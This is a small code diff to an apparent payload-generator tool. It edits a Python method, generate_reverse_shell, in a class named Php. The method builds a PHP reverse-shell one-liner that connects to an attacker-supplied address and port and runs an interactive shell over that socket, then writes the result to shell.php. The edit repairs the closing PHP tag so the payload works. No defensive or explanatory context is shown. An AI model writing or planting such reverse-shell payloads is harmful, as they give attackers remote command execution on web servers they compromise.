@@ -66,7 +66,7 @@ class Php(Shell):
         '''
 
     def generate_reverse_shell(self):
-        shell = "<?php $sock=fsockopen(\"%s\",%s);exec(\"%s -i <&3 >&3 2>&3\");>" % (self.address, self.port, self.shell)
+        shell = "<?php $sock=fsockopen(\"%s\",%s);exec(\"%s -i <&3 >&3 2>&3\");?>" % (self.address, self.port, self.shell)
         with open('shell.php', 'w') as file:
             file.write(shell)
 
